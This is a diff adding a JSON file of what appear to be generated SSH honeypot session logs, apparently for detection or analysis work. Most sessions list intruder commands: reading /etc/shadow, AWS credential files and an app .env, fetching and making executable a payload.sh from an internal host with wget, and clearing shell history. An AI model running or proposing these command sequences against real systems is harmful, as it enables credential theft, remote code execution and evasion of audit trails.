@@ -1,0 +1,982 @@
+[
+  {
+    "@timestamp": "2026-07-04T10:00:43.974287Z",
+    "session_id": "d38dbe31",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 34.22,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "cat /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 10,
+    "unique_commands": 10,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "83440ca619335fe5e76e7e19b375ac36"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 3,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:00:00Z",
+    "session_end": "2026-07-04T10:00:43.974287Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:02:18.556713Z",
+    "session_id": "7d80d558",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 90.97,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:00:43.974287Z",
+    "session_end": "2026-07-04T10:02:18.556713Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:03:13.342427Z",
+    "session_id": "8e8837d2",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 49.38,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "28cefa7b10dce0da9c0b026fef7113f0"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:02:18.556713Z",
+    "session_end": "2026-07-04T10:03:13.342427Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:04:17.835112Z",
+    "session_id": "ced1e998",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 56.47,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T10:03:13.342427Z",
+    "session_end": "2026-07-04T10:04:17.835112Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:05:33.115645Z",
+    "session_id": "826a44e2",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 65.84,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T10:04:17.835112Z",
+    "session_end": "2026-07-04T10:05:33.115645Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:06:46.729999Z",
+    "session_id": "3d5ed2a0",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 70.2,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:05:33.115645Z",
+    "session_end": "2026-07-04T10:06:46.729999Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:07:01.694025Z",
+    "session_id": "fa3c6e08",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 7.45,
+    "login_attempts": 4,
+    "login_success": false,
+    "commands": [],
+    "command_count": 0,
+    "unique_commands": 0,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 1,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "test",
+      "guest"
+    ],
+    "session_start": "2026-07-04T10:06:46.729999Z",
+    "session_end": "2026-07-04T10:07:01.694025Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:07:44.243877Z",
+    "session_id": "b7787457",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 38.16,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "98e3688de19afe807240d02954e649a7"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:07:01.694025Z",
+    "session_end": "2026-07-04T10:07:44.243877Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:09:25.150032Z",
+    "session_id": "661ff1fd",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 94.0,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": false,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:07:44.243877Z",
+    "session_end": "2026-07-04T10:09:25.150032Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:10:13.167614Z",
+    "session_id": "dae803cc",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 38.99,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "1890b471db5c6ef79d03ecec7551ee81"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:09:25.150032Z",
+    "session_end": "2026-07-04T10:10:13.167614Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:10:21.428668Z",
+    "session_id": "f2f5b940",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 6.14,
+    "login_attempts": 4,
+    "login_success": false,
+    "commands": [],
+    "command_count": 0,
+    "unique_commands": 0,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 1,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "test",
+      "guest"
+    ],
+    "session_start": "2026-07-04T10:10:13.167614Z",
+    "session_end": "2026-07-04T10:10:21.428668Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:10:59.543425Z",
+    "session_id": "ba79393a",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 34.1,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "8b8fe401cca26e2b445ac424a15b7979"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:10:21.428668Z",
+    "session_end": "2026-07-04T10:10:59.543425Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:11:57.830206Z",
+    "session_id": "a83700d0",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 51.81,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "6fb15ecd73dd3782324e6e0fc71c288a"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:10:59.543425Z",
+    "session_end": "2026-07-04T10:11:57.830206Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:12:38.726892Z",
+    "session_id": "ba03fb01",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 33.09,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "43c55bdc2be52c80f23e8bd9e7a847a3"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:11:57.830206Z",
+    "session_end": "2026-07-04T10:12:38.726892Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:13:19.697450Z",
+    "session_id": "81bef250",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 32.53,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "dd86cd2d2cd3832f7e340422c3b5d3d7"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:12:38.726892Z",
+    "session_end": "2026-07-04T10:13:19.697450Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:14:55.167886Z",
+    "session_id": "b3165435",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 89.5,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T10:13:19.697450Z",
+    "session_end": "2026-07-04T10:14:55.167886Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:15:40.722259Z",
+    "session_id": "119c2be1",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 36.12,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "3a556d9fd758b1a3d3b65b26d06f00b7"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root"
+    ],
+    "session_start": "2026-07-04T10:14:55.167886Z",
+    "session_end": "2026-07-04T10:15:40.722259Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:16:33.104573Z",
+    "session_id": "510d1047",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 49.0,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "b01e8baf59fc1bb68d6e9cf099a9316c"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:15:40.722259Z",
+    "session_end": "2026-07-04T10:16:33.104573Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:17:12.108255Z",
+    "session_id": "49890841",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 33.66,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "a1a51804df8e5b578f373ac34ee92df4"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:16:33.104573Z",
+    "session_end": "2026-07-04T10:17:12.108255Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:18:11.591314Z",
+    "session_id": "1f60e731",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 49.96,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "67cc5243b8a5092ee1bb88d2f336eedb"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:17:12.108255Z",
+    "session_end": "2026-07-04T10:18:11.591314Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:19:01.234199Z",
+    "session_id": "5f84c214",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 44.05,
+    "login_attempts": 1,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "04b32d5685f06beab178ce2ca0d103fd"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root"
+    ],
+    "session_start": "2026-07-04T10:18:11.591314Z",
+    "session_end": "2026-07-04T10:19:01.234199Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:19:56.954276Z",
+    "session_id": "726f1c54",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 48.43,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "34f0e64b1dbf9bfe0395780e4c8c3455"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 5,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:19:01.234199Z",
+    "session_end": "2026-07-04T10:19:56.954276Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:21:39.367489Z",
+    "session_id": "9c623274",
+    "attacker_ip": "172.18.0.5",
+    "service": "ssh",
+    "session_duration": 93.96,
+    "login_attempts": 3,
+    "login_success": true,
+    "commands": [
+      "uname -r",
+      "cat /etc/os-release",
+      "crontab -l",
+      "netstat -tlpn",
+      "ps aux",
+      "cat /etc/passwd",
+      "ls -la /home/admin",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /home/admin/.aws/credentials",
+      "grep AWS /opt/novapay/.env",
+      "cat /home/admin/loot/system_audit.txt",
+      "history -c"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [],
+    "file_hashes": [],
+    "brute_force_detected": true,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "admin",
+      "root"
+    ],
+    "session_start": "2026-07-04T10:19:56.954276Z",
+    "session_end": "2026-07-04T10:21:39.367489Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:22:17.944030Z",
+    "session_id": "6e09eee0",
+    "attacker_ip": "172.18.0.25",
+    "service": "ssh",
+    "session_duration": 34.97,
+    "login_attempts": 4,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 12,
+    "unique_commands": 12,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "ef946cc5497f40972f4ede68ee9aa638"
+    ],
+    "brute_force_detected": true,
+    "ttp_count": 6,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin",
+      "cloudsync"
+    ],
+    "session_start": "2026-07-04T10:21:39.367489Z",
+    "session_end": "2026-07-04T10:22:17.944030Z"
+  },
+  {
+    "@timestamp": "2026-07-04T10:23:07.374196Z",
+    "session_id": "89361301",
+    "attacker_ip": "172.18.0.15",
+    "service": "ssh",
+    "session_duration": 46.77,
+    "login_attempts": 2,
+    "login_success": true,
+    "commands": [
+      "id",
+      "whoami",
+      "uname -a",
+      "cat /etc/issue",
+      "cat /etc/passwd",
+      "grep -E 'backupsvc|cloudsync' /etc/passwd",
+      "cat /etc/shadow",
+      "grep -E 'backupsvc|cloudsync' /etc/shadow",
+      "ls -la /var/www",
+      "cat /var/www/html/config.php",
+      "cat /home/admin/loot/system_audit.txt",
+      "wget http://172.18.0.5:8000/payload.sh",
+      "chmod +x payload.sh"
+    ],
+    "command_count": 13,
+    "unique_commands": 13,
+    "files_downloaded": [
+      "payload.sh"
+    ],
+    "file_hashes": [
+      "afbfa224411347b1c29f40eb576ba3fa"
+    ],
+    "brute_force_detected": false,
+    "ttp_count": 4,
+    "session_active": false,
+    "last_event_type": "cowrie.session.closed",
+    "usernames_tried": [
+      "root",
+      "admin"
+    ],
+    "session_start": "2026-07-04T10:22:17.944030Z",
+    "session_end": "2026-07-04T10:23:07.374196Z"
+  }
+]
